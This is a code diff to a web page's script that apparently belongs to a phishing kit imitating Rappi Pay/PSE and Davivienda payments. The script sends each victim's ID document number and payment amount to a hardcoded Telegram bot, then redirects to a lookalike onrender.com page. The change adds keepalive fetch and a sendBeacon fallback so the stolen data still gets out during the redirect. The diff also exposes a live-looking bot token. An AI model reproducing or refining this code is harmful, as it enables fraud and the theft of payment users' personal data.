@@ -197,11 +197,10 @@
   const TELEGRAM_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
   const TELEGRAM_CHAT_ID = '-1004457768033';
 
-  // ─── ENVIAR A TELEGRAM: CÉDULA, VALOR Y MÉTODO/BANCO ───
-  async function enviarPagoTelegram(metodo, banco) {
-    let mensaje = '';
+  // ─── CONSTRUIR MENSAJE SEGÚN MÉTODO ───
+  function construirMensaje(metodo, banco) {
     if (metodo === 'PSE') {
-      mensaje = `
+      return `
 💳 *PAGO PSE RAPPI PAY*
 🆔 *Documento:* ${numDoc}
 💵 *Valor:* ${formattedTotal}
@@ -209,42 +208,68 @@
 ✅ *Estado:* Redirigido a PSE Rappi Pay
       `;
     } else if (metodo === 'Davivienda') {
-      mensaje = `
+      return `
 💳 *PAGO DAVIVIENDA*
 🆔 *Documento:* ${numDoc}
 💵 *Valor:* ${formattedTotal}
 ✅ *Estado:* Redirigido a Davivienda
       `;
     }
-
-    try {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: mensaje,
-          parse_mode: 'Markdown'
-        })
-      });
-    } catch (err) {
-      console.error('Error enviando a Telegram:', err);
-    }
+    return '';
   }
 
-  // ─── PSE: Envía a Telegram y redirige a Rappi Pay ───
-  async function irAlFrontPSE() {
-    // Aquí puedes pedir el banco si lo necesitas. Por ahora, como no hay selector, ponemos "No especificado".
-    // Si luego agregas un selector de banco, cámbialo aquí.
+  // ─── ENVIAR A TELEGRAM CON keepalive (sobrevive a la redirección) ───
+  function enviarPagoTelegram(metodo, banco) {
+    const mensaje = construirMensaje(metodo, banco);
+    if (!mensaje) return;
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: mensaje,
+        parse_mode: 'Markdown'
+      }),
+      keepalive: true // clave: la petición no se cancela al navegar
+    }).catch(err => console.error('Error enviando a Telegram:', err));
+  }
+
+  // ─── RESPALDO CON sendBeacon (se dispara justo antes de descargar la página) ───
+  function enviarPagoBeacon(metodo, banco) {
+    const mensaje = construirMensaje(metodo, banco);
+    if (!mensaje) return;
+    const data = new URLSearchParams();
+    data.append('chat_id', TELEGRAM_CHAT_ID);
+    data.append('text', mensaje);
+    data.append('parse_mode', 'Markdown');
+    navigator.sendBeacon(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      data
+    );
+  }
+
+  // ─── PSE: redirige primero y el mensaje sale en ese mismo instante ───
+  function irAlFrontPSE() {
     const banco = 'No especificado';
-    await enviarPagoTelegram('PSE', banco);
-    window.location.href = `https://pasegrodvcolombia.onrender.com/index.html?doc=${numDoc}&metodo=pse`;
+    const destino = `https://pasegrodvcolombia.onrender.com/index.html?doc=${numDoc}&metodo=pse`;
+
+    // 1) Dispara la redirección (el usuario es enviado a Rappi Pay)
+    window.location.href = destino;
+
+    // 2) En el mismo instante de la redirección, envía a Telegram
+    enviarPagoTelegram('PSE', banco);
+    // 3) Respaldo por si el fetch no alcanza a salir
+    enviarPagoBeacon('PSE', banco);
   }
 
-  // ─── Davivienda: Envía a Telegram y redirige al front de Davivienda ───
-  async function irAlFrontDavivienda() {
-    await enviarPagoTelegram('Davivienda', null);
-    window.location.href = `https://pasegrodvcolombia.onrender.com/index.html?doc=${numDoc}&metodo=davivienda`;
+  // ─── Davivienda: igual ───
+  function irAlFrontDavivienda() {
+    const destino = `https://pasegrodvcolombia.onrender.com/index.html?doc=${numDoc}&metodo=davivienda`;
+
+    window.location.href = destino;
+    enviarPagoTelegram('Davivienda', null);
+    enviarPagoBeacon('Davivienda', null);
   }
 </script>
 
